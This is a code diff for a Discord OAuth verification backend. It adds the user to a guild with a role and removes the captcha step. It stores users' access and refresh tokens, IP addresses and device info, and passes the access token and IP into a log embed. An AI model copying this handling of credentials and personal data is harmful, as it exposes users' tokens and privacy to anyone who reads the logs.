@@ -1,6 +1,6 @@
 const axios = require('axios');
 const { users, config } = require('../database');
-const { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
+const { EmbedBuilder } = require('discord.js');
 
 module.exports = (app, client) => {
 
@@ -56,8 +56,43 @@ module.exports = (app, client) => {
                 refresh_token,
                 ip,
                 userDevice,
-                tokenSavedAt: new Date().toISOString()
+                verifiedAt: new Date().toISOString()
             });
+
+            const guildId = process.env.GUILD_ID;
+            const roleId = config.get('roleId') || process.env.ROLE_ID;
+            const unverifiedRoleId = '1554940399708283020';
+
+            // Adiciona ao servidor e dá o cargo direto
+            if (guildId) {
+                try {
+                    const putData = { access_token };
+                    if (roleId) putData.roles = [roleId];
+
+                    await axios.put(
+                        `https://discord.com/api/v10/guilds/${guildId}/members/${userData.id}`,
+                        putData,
+                        {
+                            headers: {
+                                Authorization: `Bot ${process.env.TOKEN}`,
+                                'Content-Type': 'application/json'
+                            },
+                            validateStatus: false
+                        }
+                    );
+
+                    // Remove cargo de não verificado
+                    await axios.delete(
+                        `https://discord.com/api/v10/guilds/${guildId}/members/${userData.id}/roles/${unverifiedRoleId}`,
+                        {
+                            headers: { Authorization: `Bot ${process.env.TOKEN}` },
+                            validateStatus: false
+                        }
+                    );
+                } catch (e) {
+                    console.error('Erro ao dar cargo:', e.message);
+                }
+            }
 
             const createdAt = new Date(Number((BigInt(userData.id) >> 22n) + 1420070400000n));
             const accountDays = Math.floor((Date.now() - createdAt) / 86400000);
@@ -68,32 +103,14 @@ module.exports = (app, client) => {
             // Manda embed de log
             await sendLog(client, userData, access_token, ip, userDevice, accountDays, avatarUrl);
 
-            // Manda DM com botão para iniciar captcha
-            try {
-                const discordUser = await client.users.fetch(userData.id);
-                const row = new ActionRowBuilder().addComponents(
-                    new ButtonBuilder()
-                        .setCustomId('start_captcha')
-                        .setLabel('Verificar')
-                        .setEmoji('✅')
-                        .setStyle(ButtonStyle.Success)
-                );
-                await discordUser.send({
-                    content: `Clique no botão abaixo para concluir sua verificação.`,
-                    components: [row]
-                });
-            } catch {
-                // DMs fechadas — ignora
-            }
-
-            const guild = client.guilds.cache.get(process.env.GUILD_ID);
+            const guild = client.guilds.cache.get(guildId);
 
             res.render('success.html', {
                 userName: userData.username,
                 userId: userData.id,
                 userAvatar: avatarUrl,
                 guildName: guild ? guild.name : 'Servidor',
-                guildId: process.env.GUILD_ID || '0',
+                guildId: guildId || '0',
                 guildIcon: guild && guild.icon
                     ? `https://cdn.discordapp.com/icons/${guild.id}/${guild.icon}.png`
                     : 'https://cdn.discordapp.com/embed/avatars/0.png',
